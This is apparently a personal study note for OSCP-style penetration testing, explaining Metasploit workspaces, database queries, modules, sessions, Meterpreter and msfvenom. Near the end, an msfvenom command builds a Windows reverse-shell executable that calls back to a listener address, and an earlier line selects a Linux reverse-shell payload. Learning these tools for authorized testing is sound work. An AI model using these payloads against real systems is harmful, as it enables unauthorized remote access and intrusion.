---
title: Metasploit
---
# Workspaces
- We can create workspaces within Metasploit to better structure our findings (i.e one workspace per assessment)
- We can create a new workspace by providing the `-a` parameter to the `workspace` command. Running `workspace` without a parameter will list all available workspaces
```zsh
msf6 > workspace
* default
msf6 > workspace -a oscp
[*] Added workspace: oscp
[*] Workspace: oscp
```
- We can switch between workspaces using `workspace <name>`

# DB Backend Commands
- Metasploit will provide us with some commands to directly query the database. 
- The most important ones:
	- `hosts` - This will list all discovered hosts 
	- `services` - This will list discovered services (i.e from port scans)
	- `services -p 8000` - This will only list hosts with port 8000 open
	- `vulns` - Will list found vulnerabilities
	- `creds` - Will list found credentials

# Modules
- Metasploit provides modules in order to perform tasks. Those modules are divided into categories such as _encoders_, _payloads_, _exploits_, _evasion_ or _auxiliary_. 
- To search for a modules we can run `search` (i.e `search type:auxiliary smb` or `search Apache 2.4.49`)
- To activate a module we can run the `use`command followed by the module id (i.e `use 56`)
- After we have activated a module, we can run `info` to get information about the current module
- We can run `show options` to list the options of the current module
- To set options, we can use the `set` command followed by the option name (i.e `set RHOSTS 192.168.10.10`). We can use `unset` to remove the values. We can also set specific payloads if needed using `set payload payload/linux/x64/shell_reverse_tcp`
- After configuring the modules options, we can use `run` to launch the module. If the modules supports check, we can use `check` to perform a dry-run of the exploit to figure out if the target is vulnerable before actually exploiting

# Sessions
- After successful exploitation and obtaining an interactive shell, metasploit will generate session for us. 
- We can background the currently active session using Ctrl+Z. If we wish to send a session directly to the background, we need to run the exploit with `run -j`
- To list all active session ,we can use the `session -l` command
- To interact with with an active session, we can use the `session -i <sessionnumber>` command
- To kill a session, we can use the `session -k <sessionnumber>` command

# Payloads
- We can run `show payloads` in the context of an exploit module to list all compatible payloads
- We can then simply run `set payload <payloadnumber>` to select one of the compatible payloads

## Meterpreter
- Meterpreter provides us with a multitude of options such as `sysinfo`, `getuid`, `upload` or `download` we can run `help` in an active meterpreter session to list them
- If we run `shell` in a meterpreter session to run get an interactive shell to run commands, meterpreter will open a new channel
- We can list active channels using `channel -l` and then interact with a channel using `channel -i <channelnumber>`
- Use `lcd` and `lpwd` to navigate the local filesystem from within a meterpreter session and set the current working directory (i.e to navigate to a specific download directory)

# Msfvenom
- We can list available payload using `msfvenom -l` (i.e `msfvenom -l payloads --platform windows --arch x64`)
- We can then create a payload and save it in the appropriate format
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=9001 -f exe -o reverse_nonstaged.exe
```
> [!WARNING]
> If we use a staged payload, we need to use metasploits module `multi/handler` as `nc` does not know how to handle a staged payload. In the `multi/handler` module we need to set the corresponding payload using `set payload`

